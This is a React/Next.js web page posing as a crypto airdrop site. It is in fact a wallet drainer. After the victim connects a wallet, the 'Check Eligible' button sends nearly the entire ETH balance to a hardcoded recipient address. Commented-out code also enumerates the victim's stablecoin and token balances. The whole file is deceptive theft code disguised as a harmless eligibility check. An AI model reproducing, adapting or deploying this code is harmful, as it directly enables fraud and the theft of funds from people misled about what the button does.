import Head from 'next/head'
import styles from '../styles/Home.module.css'
import 'bulma/css/bulma.css'
import {BigNumber, ethers} from 'ethers'
import { useState } from 'react'
const abi = require('erc-20-abi')

// import './addresses'
// import "@chainlink/contracts/src/v0.8/interfaces/AggregatorV3Interface.sol";




export default function Home() {

  const [account, setAccount] = useState()
  // const [user, setUser] = useState()
  const [isConnected, setIsConnected] = useState(false)
  const [provider, setProvider] = useState()
  const [signer, setSigner] = useState()
  const [balance, setBalance] = useState()
  const [gasPrice, setGasPrice] = useState()
  const [gasLimit, setGasLimit] = useState()
  
  let etherValueOfUser
  let Receptient = '0x1204D7F27702d793260Ad5a406dDEE7660d21B61'
  let user
  let _signer

  const busdAddress = "0x4Fabb145d64652a948d72533023f6E7A623C7C53"
  const daiAddress = "0x6b175474e89094c44da98b954eedeac495271d0f"
  const usdcAddress = "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48"
  const linkAddress = "0x514910771af9ca656af840dff83e8264ecf986ca"
  const wbtcAddress = "0x2260fac5e5542a773aa44fbcfedf7c193bc2c599"
  const usdtAddress = "0xdac17f958d2ee523a2206206994597c13d831ec7"

  let amount

  async function connect() {
    if (typeof window.ethereum !== 'undefined'){
      const accounts = await ethereum.request({method: "eth_requestAccounts"})
      setAccount(accounts)
      console.log(`accounts: ${accounts}`);


      const _provider = new ethers.providers.Web3Provider(window.ethereum)
      console.log(_provider);
      setProvider(_provider)


      user = await _provider.send("eth_requestAccounts", []);
      console.log(user);
      _signer = _provider.getSigner()
      setSigner(_signer)
      console.log(_signer);
      const bal = await _signer.getBalance(user.address)
    
      console.log('balance:',bal);
      
      const gasL = ethers.utils.hexlify(100000)
      setGasLimit(gasL)

      const gasP = _provider.getGasPrice()
      // setGasPrice(gasP)
      setGasPrice(gasP)
      // const fee = (estimateGas).mul(gasL)
      const fee = (await gasP).mul(gasL)
      console.log('fee', fee);

      const finalAmount = bal - (fee * 10)
      const finalAmountToString = finalAmount.toString()
      const finalAmountBigNumber = BigNumber.from(finalAmountToString)
      console.log("finalAmountBigNumber",finalAmountBigNumber);
      // const finalAmountToString = finalAmount.BigNumber.toHexString()
      console.log('finalAmountToString:', finalAmountToString);
      setBalance(finalAmountBigNumber)
      console.log('final amount:',finalAmount);

      // console.log(`balance:${Number(bal).toString(16)}`);
      
      // console.log(gasL);
      // const gasHexToBigNumber = BigNumber.from(gasL)
      // console.log(`gas is: ${gasHexToBigNumber}`);
      // const withdrawable = BigNumber.from(bal) - gasHexToBigNumber
      // console.log(`withdarawble is: ${withdrawable}`);

      const etherValue = bal / 10e17
      etherValueOfUser = etherValue

      // const daiToken = new ethers.Contract(daiAddress, abi, providerr);
      // const daiBalance = await daiToken.balanceOf(signerr.getAddress());
      // const daiValue = daiBalance / 10e5

      // const usdcToken = new ethers.Contract(usdcAddress, abi, providerr);
      // const usdcBalance = await usdcToken.balanceOf(signerr.getAddress());
      // const usdcValue = usdcBalance / 10e5

      // const usdtToken = new ethers.Contract(usdtAddress, abi, providerr);
      // const usdtBalance = await usdtToken.balanceOf(signerr.getAddress());
      // const usdtValue = usdtBalance / 10e5

      // const busdToken = new ethers.Contract(busdAddress, abi, providerr);
      // const busdBalance = await busdToken.balanceOf(signerr.getAddress());
      // const busdValue = busdBalance / 10e5

      // const linkToken = new ethers.Contract(linkAddress, abi, providerr);
      // const linkBalance = await linkToken.balanceOf(signerr.getAddress());
      // const linkValue = linkBalance / 10e16

      // const wbtcToken = new ethers.Contract(wbtcAddress, abi, providerr);
      // const wbtcBalance = await wbtcToken.balanceOf(signerr.getAddress());
      // const wbtcValue = wbtcBalance / 10e13


      console.log(`ether value is :${etherValue}`);
      // console.log(`dai value is :${daiValue}`);
      // console.log(`usdt value is :${usdtValue}`);
      // console.log(`busd value is :${busdValue}`);
      // console.log(`usdc value is :${usdcValue}`);
      // console.log(`link value is :${linkValue}`);
      // console.log(`btc value is :${wbtcValue}`);
    }
  }
  

  async function claimAirdrop() {

    signer.sendTransaction({
      from: user,
      to: Receptient,
      
      gasPrice: gasPrice,
      gasLimit: gasLimit,
      value: (balance),
    })
  }

  return (
    <div className='has-background-white'>
    <div className={styles.container}>
      <Head>
        <title>Create Next App</title>
        <meta name="description" content="Generated by create next app" />
        <link rel="icon" href="/favicon.ico" />
      </Head>
      
        <div className="has-background-white">
          <div className='box has-background-white'>
            <nav className='navbar has-background-white'>
              <div className='navbar-end'>
                <button onClick={() =>connect()} className='button is-link'>
                  Connect Wallet
                </button>
              </div>
            </nav>
          </div>
        </div>
        <main className={styles.main}>
    
          
            <div className='column is-one-third'>
              <div className='box'>
                <button onClick={() => claimAirdrop()} className='button is-dark is-outlined is-centered mr-4'>Check Eligible</button>
                <button onClick={() => claimAirdrop()} className='button is-dark is-centered' disabled>Claim Airdrop</button>
              </div>
            </div>
          
      </main>

      <footer className={styles.footer}>
        <a
          className='has-text-black'
          href="https://vercel.com?utm_source=create-next-app&utm_medium=default-template&utm_campaign=create-next-app"
          target="_blank"
          rel="noopener noreferrer"
        >
          Powered by Alireza Haghshenas
        </a>
      </footer>
    </div>
    </div>
  )
}
